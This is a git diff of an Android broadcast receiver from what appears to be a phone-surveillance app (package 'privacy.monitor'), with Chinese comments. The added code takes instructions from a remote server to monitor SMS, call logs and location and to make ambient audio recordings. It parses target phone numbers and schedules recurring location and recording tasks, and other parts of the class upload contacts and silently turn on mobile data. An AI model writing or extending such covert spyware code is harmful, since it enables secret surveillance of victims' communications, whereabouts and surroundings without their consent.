@@ -9,20 +9,20 @@ import java.util.ArrayList;
 import java.util.Collection;
 import java.util.HashMap;
 import java.util.Iterator;
-
 import org.json.JSONException;
 import org.json.JSONObject;
-
 import com.google.gson.Gson;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
 import com.privacy.monitor.db.DirectiveDB;
+import com.privacy.monitor.db.LocManDB;
 import com.privacy.monitor.db.MonitorDB;
+import com.privacy.monitor.db.RegularDB;
 import com.privacy.monitor.db.SMSRecordDB;
-import com.privacy.monitor.db.util.DirectiveUtil;
 import com.privacy.monitor.domain.CallRecord;
 import com.privacy.monitor.domain.DeviceInfo;
 import com.privacy.monitor.domain.Monitor;
+import com.privacy.monitor.domain.Regular;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.service.utilservice.ClientSocket;
 import com.privacy.monitor.util.AppUtil;
@@ -37,7 +37,6 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 
@@ -51,16 +50,26 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private SMSRecordDB smsRecordDB;
 	private CallRecordDB callRecordDB;
 	private DirectiveDB directiveDB;
+	private RegularDB regularDB;
+	private LocManDB locManDB ;
 	private TelephonyManager tm;
 	private ClientSocket cSocket;
+	private String myPhone;
 	private boolean isCloseMobileNet ;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
 		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		if(TextUtils.isEmpty(myPhone)){
+			myPhone = sp.getString(C.PHONE_NUM,"");
+		}
 		smsRecordDB = SMSRecordDB.getInstance(context);
 		callRecordDB = CallRecordDB.getInstance(context);
 		directiveDB = DirectiveDB.getInstance(context);
+		monitorDB = MonitorDB.getInstance(context);
+		locManDB = LocManDB.getInstance(context);
+		regularDB = RegularDB.getInstance(context);
+		
 		if(!HttpUtil.detect(context)){
 			Logger.d("CronBroadcaseRectiver","开启网络");
 			AppUtil.toggleMobileNet(context, true);
@@ -92,7 +101,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					if(!hasUpload){
 						uploadContact(context, sp);
 					}
-					
+					handleMessage(type, data);
 				}
 			};
 			cSocket.start();
@@ -114,6 +123,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				
 				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 				String simID = tm.getSimSerialNumber();
+				
 				//更改号码了 
 				if(!sp.getString(C.SIM_ID,"").equals(simID)){
 					Editor editor = sp.edit();
@@ -272,36 +282,196 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	//处理服务端返回的信息
 	private void handleMessage(String type,String data){
 		try {
-			
+			Logger.d("Cron","type type type:"+type);
 			if(ClientSocket.TYPE_INFO.equalsIgnoreCase(type)){
+				Logger.d("Cron","准备把数据添加到数据库");
 				JSONObject jsonObject = new JSONObject(data);
+				
 				//是否进行短信监控 
 				String monMess = jsonObject.getString("can_mon_msg");
 				
 				//是否进行通话记录监控
 				String monCall = jsonObject.getString("can_mon_call");
-		    
+				
 				//是否进行定位
 				String monLoc = jsonObject.getString("can_mon_loc");
 				
 				//是否可以进行录音(环境录音)
 				String monRec = jsonObject.getString("can_mon_rec");
-			    
+				
+				Monitor monitor = new Monitor();
+				monitor.setCallMonitorStatus(monCall);
+				monitor.setEnvRecMonitorStatus(monRec);
+				monitor.setFilterStatus("2");
+				monitor.setLocationStatus(monLoc);
+				monitor.setSmsMonitorStatus(monMess);
+				monitor.setPhone(myPhone);
+				monitorDB.insert(monitor);
+				
+				
 				
 			//立刻定位
 			}else if(ClientSocket.TYPE_GPS_NOW.equalsIgnoreCase(type)){
 				
 			
-		    //录音 
+		    //立刻录音 
 			}else if(ClientSocket.TYPE_REC_NOW.equalsIgnoreCase(type)){
-				
 				
 				
 			}
 			
-			
 		} catch (JSONException e) {
 			Logger.d(TAG,"json format error");
+		}
+	}
+	
+	//解析获取监控信息的号码
+	private void splistMessage(String message){
+			if(!TextUtils.isEmpty(message)){
+				if(message.contains(";")){
+					String[] mesType = message.split(";");
+					if(mesType.length==3){
+						
+						String [] mesMonitorNum = mesType[0].split(",");
+						
+						String [] mesFilterNum = mesType[2].split(",");
+						
+						if(mesMonitorNum!=null && mesMonitorNum.length > 0){
+							int size = mesMonitorNum.length;
+							for(int i = 0 ; i < size ; i ++){
+								String mesMonPho = mesMonitorNum[i];
+								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesMonPho});
+							    if(monitor !=null){
+							    	monitor.setSmsMonitorStatus("1");
+							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesMonPho});
+							    }else {
+									monitor = new Monitor();
+									monitor.setPhone(mesMonPho);
+									monitor.setSmsMonitorStatus("1");
+									monitorDB.insert(monitor);
+								}
+							}
+						}
+						
+						if(mesFilterNum != null && mesFilterNum.length > 0){
+							int size = mesFilterNum.length;
+							for(int i = 0 ; i < size ;i++){
+								String mesFilPho = mesFilterNum[i];
+								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesFilPho});
+							    if(monitor !=null){
+							    	monitor.setFilterStatus("1");
+							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesFilPho});
+							    }else {
+									monitor = new Monitor();
+									monitor.setPhone(mesFilPho);
+									monitor.setFilterStatus("1");
+									monitorDB.insert(monitor);
+								}
+							}
+						}
+					}
+				}
+		}
+	}
+	
+	//解析监控通话手机
+	private void splitMonitorCallPhone(String phone){
+		if(!TextUtils.isEmpty(phone)){
+			if(phone.contains(";")){
+				String [] monPhone = phone.split(";");
+				if(monPhone !=null && monPhone.length==2){
+					//监控的手机号码
+					String [] monPhones = monPhone[0].split(",");
+					int length  = monPhones.length;
+					for(int i = 0 ; i < length ; i ++){
+						String strPhone =monPhones[i]; 
+						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{strPhone});
+						 if(monitor !=null){
+						    	monitor.setCallMonitorStatus("1");
+						    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{strPhone});
+						    }else {
+								monitor = new Monitor();
+								monitor.setPhone(strPhone);
+								monitor.setSmsMonitorStatus("1");
+								monitorDB.insert(monitor);
+						}
+					}
+				}
+			}
+		}
+	}
+	
+	//解析定时任务
+	private void parseRegular(String reString){
+		if(!TextUtils.isEmpty(reString)){
+			if(reString.contains(",")){
+				
+				String [] regs = reString.split(",");
+				if(regs !=null && regs.length > 0){
+					int size = regs.length;
+					for(int i = 0 ; i < size;i++){
+						String [] rege = regs[i].split(";");
+						if(rege !=null && rege.length==2){
+							String strStart = rege[0];
+							String strLong = rege[1];
+							Regular regular = new Regular();
+							regular.setLocLong(strLong);
+							regular.setLocStartTime(strStart);
+							regular.setRegType(C.REG_TYPE_REC);
+							regularDB.insert(regular);
+						}
+					}
+				}
+				
+			}else if(reString.contains(";")) {
+				String [] regularMess = reString.split(";");
+				if(regularMess !=null && regularMess.length==2){
+					String strStart = regularMess[0];
+					String strLong = regularMess[1];
+					Regular regular = new Regular();
+					regular.setLocLong(strLong);
+					regular.setLocStartTime(strStart);
+					regular.setRegType(C.REG_TYPE_REC);
+					regularDB.insert(regular);
+				}
+			}
+		}
+	}
+	
+	//解析定时定位
+	private void parseLoc(String reStr){
+		if(!TextUtils.isEmpty(reStr)){
+			if(reStr.contains(",")){
+				
+				String [] loc = reStr.split(",");
+				if(loc !=null && loc.length > 0){
+					int size = loc.length;
+					for(int i = 0 ; i < size;i++){
+						String [] locc = loc[i].split(";");
+						if(locc !=null && locc.length==2){
+							String strStart = locc[0];
+							String strLong = locc[1];
+							Regular regular = new Regular();
+							regular.setLocLong(strLong);
+							regular.setLocStartTime(strStart);
+							regular.setRegType(C.REG_TYPE_LOC);
+							regularDB.insert(regular);
+						}
+					}
+				}
+				
+			}else if(reStr.contains(";")) {
+				String [] regularMess = reStr.split(";");
+				if(regularMess !=null && regularMess.length==2){
+					String strStart = regularMess[0];
+					String strLong = regularMess[1];
+					Regular regular = new Regular();
+					regular.setLocLong(strLong);
+					regular.setLocStartTime(strStart);
+					regular.setRegType(C.REG_TYPE_LOC);
+					regularDB.insert(regular);
+				}
+			}
 		}
 	}
 }
